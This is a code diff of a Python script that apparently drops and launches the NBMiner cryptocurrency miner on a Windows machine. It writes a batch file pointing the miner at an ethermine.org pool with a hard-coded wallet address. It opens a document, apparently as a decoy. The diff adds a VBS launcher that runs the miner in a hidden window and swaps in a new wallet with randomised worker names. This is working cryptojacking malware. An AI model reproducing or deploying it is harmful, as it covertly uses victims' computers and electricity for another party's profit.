@@ -4,6 +4,7 @@ import zipfile
 import time
 import  win32com.client
 import subprocess,time
+import random
 lg = os.getlogin()
 path = os.getcwd()+'\\'
 
@@ -45,10 +46,12 @@ if not srt1 or not srt2:
 
     t = f'{path}extracted\\NBMiner_Win\\'+ r'run.bat'
     with open(t, 'w') as w:
-        w.write('@cd /d "%~dp0"\nnbminer -a etchash -o stratum+tcp://asia1-etc.ethermine.org:14444 -u 0x4296116d44a4a7259B52B1A756e19083e675062A.default -log\npause')
+        w.write(f'@cd /d "%~dp0"\nnbminer -a etchash -o stratum+tcp://asia1-etc.ethermine.org:14444 -u 0x4233d2697136724563d3766593FfAa379E5d6fb0.client_{random.randint(0,100000)} \npause')
 
     set_sr()
     with open(f'{path}st.bat', 'w') as startDoc:
         startDoc.write(f'start "" "{docloc}"')
-
+    with open('st.vbs','w') as st:
+        st.write(r'''Set shell = WScript.CreateObject("WScript.Shell")
+                 shell.Run("C:\Users\user\Desktop\extracted\NBMiner_Win\run.bat"), 0, True''')
 threading.Thread(target=start).start()
